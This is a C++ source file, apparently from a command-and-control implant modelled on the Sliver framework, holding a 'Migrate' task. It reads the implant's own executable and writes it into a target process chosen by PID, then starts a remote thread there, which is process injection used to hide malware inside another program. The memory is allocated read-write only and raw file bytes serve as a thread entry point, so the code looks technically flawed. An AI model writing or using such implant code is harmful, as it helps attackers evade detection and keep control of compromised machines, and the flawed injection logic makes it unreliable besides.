#include "core/task.hpp"

typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

namespace Task
{
    // Reference:
    // https://github.com/BishopFox/sliver/blob/master/implant/sliver/taskrunner/task_windows.go#L135
    std::wstring Migrate(State::PSTATE pState, const std::wstring& wPid)
    {
        DWORD dwPid = Utils::Convert::WstringToDWORD(wPid, 10);

        HANDLE hCurrProcess = GetCurrentProcess();

        // Get the current process executable file name to migrate.
        WCHAR execName[MAX_PATH*4];

        DWORD dwFileLen = GetProcessImageFileNameW(
            hCurrProcess,
            const_cast<LPWSTR>(execName),
            MAX_PATH*4
        );
        if (dwFileLen == 0)
        {
            return L"Error: Failed to get the current process executable file name.";
        }

        // Read the executable file data to write process memory.
        std::vector<BYTE> bytes = System::Fs::ReadBytesFromFile(pState->pProcs, std::wstring(execName));

        // Open target process to migrate.
        HANDLE hTargetProcess = System::Process::ProcessOpen(
            pState->pProcs,
            dwPid,
            PROCESS_DUP_HANDLE
        );
        if (!hTargetProcess)
        {
            return L"Error: Could not open the target process.";
        }

        HANDLE hDuplProcess;

        NTSTATUS status = pState->pProcs->lpNtDuplicateObject(
            hTargetProcess,
            &hCurrProcess,
            hCurrProcess,
            &hDuplProcess,
            DUPLICATE_SAME_ACCESS,
            FALSE,
            0
        );
        if (status != STATUS_SUCCESS)
        {
            return L"Error: Failed to duplicate handle.";
        }

        LPVOID pRemoteAddr = System::Process::VirtualMemoryAllocate(
            pState->pProcs,
            hDuplProcess,
            bytes.size(),
            MEM_COMMIT,
            PAGE_READWRITE
        );

        DWORD dwWritten;
        if (!System::Process::VirtualMemoryWrite(
            pState->pProcs,
            hDuplProcess,
            pRemoteAddr,
            bytes.data(),
            bytes.size(),
            &dwWritten
        ) || dwWritten != bytes.size()) {
            return L"Error: Failed to write target process memory.";
        }

        HANDLE hThread = System::Process::RemoteThreadCreate(
            pState->pProcs,
            hDuplProcess,
            (LPTHREAD_START_ROUTINE)pRemoteAddr,
            NULL
        );
        if (!hThread)
        {
            return L"Error: Failed to create remote thread on the target process.";
        }

        // Terminate the current (original) process.
        // if (System::Process::ProcessTerminate(
        //     pState->pProcs,
        //     hCurrProcess,
        //     EXIT_SUCCESS
        // )) {
        //     return L"Error: Failed to terminate the current process.";
        // }

        return L"Success: Migrated successfully.";
    }
}
